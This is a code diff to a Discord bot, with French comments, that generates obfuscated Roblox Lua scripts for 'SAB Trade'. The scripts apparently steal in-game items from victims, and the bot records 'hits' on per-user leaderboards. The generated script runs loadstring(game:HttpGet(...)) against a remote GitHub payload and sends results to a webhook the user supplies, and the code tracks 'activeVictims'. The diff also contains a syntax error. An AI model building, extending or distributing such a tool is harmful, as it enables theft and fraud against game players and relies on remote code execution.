@@ -139,6 +139,12 @@ mongoose.connect(MONGO_URI)
   .catch(err => log(`❌ [DB] ERREUR : ${err}`));
 
 // --- MODÈLES ---
+const hitEventSchema = new mongoose.Schema({
+    userId: { type: String, required: true },     // Discord ID
+    username: { type: String, required: true },   // Nom d'utilisateur
+    timestamp: { type: Date, default: Date.now }  // Date précise du hit
+});
+
 const WebHookIdSchema = new mongoose.Schema({
     webhookId: {
         type: String,
@@ -149,7 +155,7 @@ const WebHookIdSchema = new mongoose.Schema({
         required: true,
         trim: true
     },
-    ownerName: {
+    userId: {
         type: String,
         required: true,
         trim: true
@@ -158,6 +164,10 @@ const WebHookIdSchema = new mongoose.Schema({
     timestamps: true
 });
 
+// Create an index for faster date-based queries
+hitEventSchema.index({ timestamp: -1 });
+
+const HitEvent = mongoose.model('HitEvent', hitEventSchema);
 const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);
 
 const activeVictims = new Map();
@@ -175,25 +185,39 @@ const clientDiscord = new Client({
 });
 
 const commands = [
+    // Generate Command
     new SlashCommandBuilder()
         .setName('generate-sab-trade')
-        .setDescription('Generate a SAB Trade script')
+        .setDescription('Generate a customized SAB Trade script')
+        .addStringOption(option => 
+            option.setName('username').setDescription('Roblox usernames separated by commas').setRequired(true))
+        .addStringOption(option => 
+            option.setName('webhook').setDescription('Your Discord Webhook URL').setRequired(true))
+        .addIntegerOption(option => 
+            option.setName('income').setDescription('Minimum income threshold (e.g., 10000000)').setRequired(true))
+        .addStringOption(option => 
+            option.setName('visual').setDescription('Custom URL for the visual interface (Optional)').setRequired(false)),
+
+    // Leaderboard Command
+    new SlashCommandBuilder()
+        .setName('leaderboard')
+        .setDescription('Display the top hit contributors')
         .addStringOption(option =>
-            option.setName('username')
-                .setDescription('List of Roblox usernames separated by commas')
-                .setRequired(true))
-        .addStringOption(option =>
-            option.setName('webhook')
-                .setDescription('Discord Webhook URL')
-                .setRequired(true))
-        .addIntegerOption(option =>
-            option.setName('income')
-                .setDescription('Minimum income threshold (e.g. 10000000)')
-                .setRequired(true))
-        .addStringOption(option =>
-            option.setName('visual')
-                .setDescription('URL for the visual interface (Optional)')
-                .setRequired(false)) // Paramètre optionnel
+            option.setName('type')
+                .setDescription('Select the timeframe for the leaderboard')
+                .setRequired(true)
+                .addChoices(
+                    { name: 'Daily', value: 'daily' },
+                    { name: 'Weekly', value: 'weekly' },
+                    { name: 'Monthly', value: 'monthly' },
+                    { name: 'All Time', value: 'alltime' }
+                )),
+
+    // Total Hits Command
+    new SlashCommandBuilder()
+        .setName('totalhits')
+        .setDescription('View your personal hit statistics and global rank')
+
 ].map(cmd => cmd.toJSON());
 
 clientDiscord.once(Events.ClientReady, async () => {
@@ -213,7 +237,61 @@ clientDiscord.once(Events.ClientReady, async () => {
 
 clientDiscord.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
-
+    if (interaction.commandName === 'totalhits') {
+        const userId = interaction.user.id;
+    
+        // Calcul du total
+        const totalHits = await HitEvent.countDocuments({ userId });
+    
+        // Calcul du rang (All-time)
+        const aggregateRank = await HitEvent.aggregate([
+            { $group: { _id: "$userId", count: { $sum: 1 } } },
+            { $sort: { count: -1 } }
+        ]);
+        const rank = aggregateRank.findIndex(u => u._id === userId) + 1;
+    
+        const statsEmbed = new EmbedBuilder()
+            .setTitle("📊 Your Hit Stats")
+            .setColor(0x5865F2)
+            .addFields(
+                { name: "Total hits", value: `**${totalHits}**`, inline: false },
+                { name: "Your rank (all-time)", value: `#${rank || "N/A"}`, inline: false }
+            )
+            .setFooter({ text: `Rusteez Script` });
+    
+        await interaction.reply({ embeds: [statsEmbed], flags: [MessageFlags.Ephemeral] });
+    }
+    if (interaction.commandName === 'leaderboard') {
+        const type = interaction.options.getString('type'); // "daily", "weekly", etc.
+        let dateFilter = {};
+    
+        // Définition de la période
+        const now = new Date();
+        if (type === 'daily') dateFilter = { timestamp: { $gte: new Date(now.setHours(0,0,0,0)) } };
+        else if (type === 'weekly') dateFilter = { timestamp: { $gte: new Date(now.setDate(now.getDate() - 7)) } };
+        else if (type === 'monthly') dateFilter = { timestamp: { $gte: new Date(now.setMonth(now.getMonth() - 1)) } };
+    
+        // Agrégation des données
+        const topUsers = await HitEvent.aggregate([
+            { $match: dateFilter },
+            { $group: { _id: "$userId", username: { $first: "$username" }, hits: { $sum: 1 } } },
+            { $sort: { hits: -1 } },
+            { $limit: 10 }
+        ]);
+    
+        let description = topUsers.map((user, i) => {
+            const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : `${i + 1}.`;
+            return `${medal} **@${user.username}** — **${user.hits}** hits`;
+        }).join('\n');
+    
+        const lbEmbed = new EmbedBuilder()
+            .setTitle(`${type.charAt(0).toUpperCase() + type.slice(1)} Hitcount`)
+            .setColor(0xFFAA00)
+            .setDescription(`Top 10 users (${type})\n\n${description || "Aucune donnée"}`)
+            .setFooter({ text: "YT: MoziOnTop • Aujourd'hui" });
+    
+        await interaction.reply({ embeds: [lbEmbed] });
+    }
     if (interaction.commandName === 'generate-sab-trade') {
         // 1. On prévient Discord qu'on travaille (indispensable pour éviter le timeout)
         try {
@@ -228,7 +306,7 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
             const webhookUrl = interaction.options.getString('webhook');
             const income = interaction.options.getInteger('income');
             const visual = interaction.options.getString('visual') || "";
-            
+            const userId = interaction.user.id;
             // Génération de l'ID unique pour la base de données
             const webhookUuid = generateWebhookId();
 
@@ -236,7 +314,7 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
             const newWebhookEntry = new WebHookId({
                 webhookId: webhookUuid,
                 url: webhookUrl,
-                ownerName: interaction.user.tag
+                userId: = userId;
             });
             await newWebhookEntry.save();
             log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.tag}`);
@@ -248,6 +326,7 @@ fenv["Receivers"] = { ${userArrayLua} }
 fenv["WebHook"] = "${webhookUuid}"
 fenv["Visual"] = "${visual}"
 fenv["MinIncome"] = ${income}
+fenv["UserId"] = ${userId}
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde"))()`;
 
             // 4. Obfuscation via WeAreDevs (Utilise tes cookies configurés sur Render)
